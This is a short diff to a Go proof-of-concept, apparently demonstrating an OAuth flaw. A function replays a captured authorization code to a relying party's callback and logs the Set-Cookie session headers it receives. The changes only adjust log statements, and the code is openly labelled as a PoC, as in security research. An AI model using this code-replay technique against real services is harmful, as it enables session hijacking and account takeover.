@@ -145,14 +145,10 @@ func capture(w http.ResponseWriter, r *http.Request) {
 }
 
 func completeOAuth(code string) {
-	log.Println("[PoC] Calling RP callback...")
-
 	params := url.Values{}
-
 	params.Set("code", code)
-
 	target := rpCallback + "?" + params.Encode()
-
+	log.Printf("[PoC] sending request to %v", target)
 	req, err := http.NewRequest(
 		http.MethodGet,
 		target,
@@ -188,8 +184,6 @@ func completeOAuth(code string) {
 	defer resp.Body.Close()
 
 	log.Println("[PoC] RP status:", resp.Status)
-
-	log.Println()
 	log.Println("======================================")
 	log.Println("[PoC] COOKIE")
 	log.Println(resp.Header.Values("Set-Cookie"))
